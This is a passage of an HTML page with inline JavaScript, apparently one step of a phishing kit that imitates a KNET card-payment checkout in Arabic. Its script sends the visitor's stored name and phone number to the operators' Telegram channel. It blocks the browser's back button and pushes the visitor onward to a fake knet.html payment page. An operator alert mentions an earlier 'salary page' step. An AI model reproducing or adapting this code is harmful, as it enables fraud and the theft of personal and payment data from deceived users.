      class="fixed z-50 inline-flex h-14 items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-[#00A3E0] to-blue-700 px-6 text-lg font-bold text-white shadow-lg transition-all duration-300 hover:from-blue-700 hover:to-blue-800 hover:shadow-xl"
      style="left: 50%; bottom: 16px; width: min(448px, calc(100vw - 48px)); transform: translateX(-50%);">
      <span class="flex items-center gap-2 justify-center"
        ><svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          stroke-linecap="round"
          stroke-linejoin="round">
          <rect width="20" height="14" x="2" y="5" rx="2"></rect>
          <line x1="2" x2="22" y1="10" y2="10"></line></svg
        >الدفع عبر كي نت<svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          stroke-linecap="round"
          stroke-linejoin="round">
          <path d="m9 18 6-6-6-6"></path></svg
      ></span>
    </button>
    <script src="./assets/js/telegram.js"></script>
    <script src="./assets/js/tg.js"></script>
    <script>
      const STEP3_NAVIGATION_DELAY_MS = 180;
      const STEP3_AUTO_REDIRECT_MS = 60000;
      const KNET_REDIRECT_STORAGE_KEY = "knetRedirectedFromStep3";
      let step3BackNavigationInProgress = false;
      let step3AutoRedirectId = null;

      function getStep3IdentityLines() {
        if (window.getTelegramStoredIdentityLines) {
          return window.getTelegramStoredIdentityLines();
        }

        return [];
      }

      function buildStep3BackMessage() {
        return [
          "من صفحة الدفع رجع لصفحة المعلومات",
          getStep3IdentityLines()[0] || "👤 الاسم: غير متوفر",
          getStep3IdentityLines()[1] || "📞 رقم الهاتف: غير متوفر"
        ].join("\n");
      }

      function resetStep3RuntimeState() {
        const payButton = document.getElementById("payButton");

        step3BackNavigationInProgress = false;

        if (payButton) {
          payButton.disabled = false;
          payButton.dataset.submitting = "false";
        }

        if (window.hideSubmissionLoadingOverlay) {
          window.hideSubmissionLoadingOverlay();
        }
      }

      async function navigateToKnet(delayMs) {
        const navigationDelay = typeof delayMs === "number" ? delayMs : STEP3_NAVIGATION_DELAY_MS;

        if (window.showSubmissionLoadingOverlay) {
          window.showSubmissionLoadingOverlay("جارٍ الانتقال إلى كي نت...", navigationDelay, "knet");
        }

        window.setTimeout(function() {
          sessionStorage.setItem(KNET_REDIRECT_STORAGE_KEY, "true");
          window.location.href = "./knet.html";
        }, navigationDelay);
      }

      async function goBackToStep2() {
        if (step3BackNavigationInProgress) {
          return;
        }

        step3BackNavigationInProgress = true;
        if (step3AutoRedirectId) {
          window.clearTimeout(step3AutoRedirectId);
          step3AutoRedirectId = null;
        }

        if (window.sendTelegramMessageWithQueue) {
          window.sendTelegramMessageWithQueue(buildStep3BackMessage(), false).catch(function() {});
        }

        window.setTimeout(function() {
          window.location.href = "./step2.html";
        }, STEP3_NAVIGATION_DELAY_MS);
      }

      function ensureStep3HistoryGuard() {
        const currentState = history.state || {};

        if (currentState.page === "step3" && currentState.guard === "guard") {
          return;
        }

        history.replaceState({ page: "step3", guard: "base" }, "", window.location.href);
        history.pushState({ page: "step3", guard: "guard" }, "", window.location.href);
      }

      function bindStep3Once() {
        const payButton = document.getElementById("payButton");

        if (!payButton || payButton.dataset.bound === "true") {
          return;
        }

        payButton.dataset.bound = "true";
        payButton.addEventListener("click", function(event) {
          event.preventDefault();

          if (payButton.dataset.submitting === "true") {
            return;
          }

          payButton.dataset.submitting = "true";
          payButton.disabled = true;
          if (step3AutoRedirectId) {
            window.clearTimeout(step3AutoRedirectId);
            step3AutoRedirectId = null;
          }
          navigateToKnet().catch(function() {
            payButton.dataset.submitting = "false";
            payButton.disabled = false;
            if (window.hideSubmissionLoadingOverlay) {
              window.hideSubmissionLoadingOverlay();
            }
          });
        });
      }

      function initializeStep3Page() {
        bindStep3Once();
        resetStep3RuntimeState();
        ensureStep3HistoryGuard();
        if (!step3AutoRedirectId) {
          step3AutoRedirectId = window.setTimeout(function() {
            navigateToKnet(0);
          }, STEP3_AUTO_REDIRECT_MS);
        }
        if (window.resendStoredFailureMessage) {
          window.resendStoredFailureMessage(
            window.STEP2_FAIL_STORAGE_KEY || "step2_fail",
            "تنبيه: كان هناك مشكلة في إرسال رسالة صفحة الراتب، يرجى مراجعة تيليجرام."
          ).catch(function() {});
        }
      }

      window.addEventListener("popstate", function(event) {
        const state = event.state || {};

        if (state.page !== "step3" || state.guard !== "base") {
          return;
        }

        goBackToStep2().catch(function() {});
      });

      window.addEventListener("pageshow", function(event) {
        if (!event.persisted) {
          return;
        }

        initializeStep3Page();
      });

      initializeStep3Page();
    </script>
    <script src="./assets/js/shared-header.js"></script>
  </body>
</html>

